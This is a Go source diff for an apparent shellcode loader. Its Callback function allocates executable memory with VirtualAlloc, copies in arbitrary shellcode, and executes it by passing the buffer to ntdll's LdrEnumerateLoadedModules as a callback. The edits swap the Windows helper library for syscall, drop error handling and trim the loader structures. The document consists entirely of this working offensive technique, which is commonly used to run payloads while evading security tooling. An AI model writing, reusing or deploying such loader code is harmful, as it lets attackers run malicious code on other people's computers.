@@ -1,8 +1,6 @@
 package TT
 
 import (
-	"golang.org/x/sys/windows"
-	"log"
 	"syscall"
 	"unsafe"
 )
@@ -36,41 +34,33 @@ type UNICODE_STRING struct {
 	Buffer        *uint16
 }
 
-type PUNICODE_STRING *UNICODE_STRING
-
-type PACTIVATION_CONTEXT unsafe.Pointer
-
 type LDR_DATA_TABLE_ENTRY struct {
-	InLoadOrderLinks            windows.LIST_ENTRY
-	InMemoryOrderLinks          windows.LIST_ENTRY
-	InInitializationOrderLinks  windows.LIST_ENTRY
-	DllBase                     unsafe.Pointer
-	EntryPoint                  unsafe.Pointer
-	SizeOfImage                 uint32
-	FullDllName                 UNICODE_STRING
-	BaseDllName                 UNICODE_STRING
-	Flags                       uint32
-	LoadCount                   uint16
-	TlsIndex                    uint16
-	HashLinks                   windows.LIST_ENTRY
-	SectionPointer              unsafe.Pointer
-	CheckSum                    uint32
-	TimeDateStamp               uint32
-	LoadedImports               unsafe.Pointer
-	EntryPointActivationContext PACTIVATION_CONTEXT
-	PatchInformation            unsafe.Pointer
+	InLoadOrderLinks           LIST_ENTRY
+	InMemoryOrderLinks         LIST_ENTRY
+	InInitializationOrderLinks LIST_ENTRY
+	DllBase                    uintptr
+	EntryPoint                 uintptr
+	SizeOfImage                uint32
+	FullDllName                UNICODE_STRING
+	BaseDllName                UNICODE_STRING
+	Flags                      uint32
+	LoadCount                  uint16
+	TlsIndex                   uint16
+	HashLinks                  LIST_ENTRY
+	TimeDateStamp              uint32
 }
+
+type LIST_ENTRY struct {
+	Flink *LIST_ENTRY
+	Blink *LIST_ENTRY
+}
+
+type LDR_ENUM_CALLBACK func(ModuleInformation *LDR_DATA_TABLE_ENTRY, Parameter int16, Stop int16) uintptr
 
 func Callback(shellcode []byte) {
 	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
 	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-	hNtdll, err1 := windows.LoadLibrary("ntdll")
-	if err1 != nil {
-		log.Fatal(err1)
-	}
-	LdrEnumerateLoadedModules, err := windows.GetProcAddress(hNtdll, "LdrEnumerateLoadedModules")
-	if err != nil {
-		log.Fatal(err)
-	}
-	syscall.SyscallN(LdrEnumerateLoadedModules, 3, NULL, addr, NULL)
+	hNtdll, _ := syscall.LoadLibrary("ntdll")
+	LdrEnumerateLoadedModules, _ := syscall.GetProcAddress(hNtdll, "LdrEnumerateLoadedModules")
+	syscall.SyscallN(LdrEnumerateLoadedModules, NULL, addr, NULL)
 }
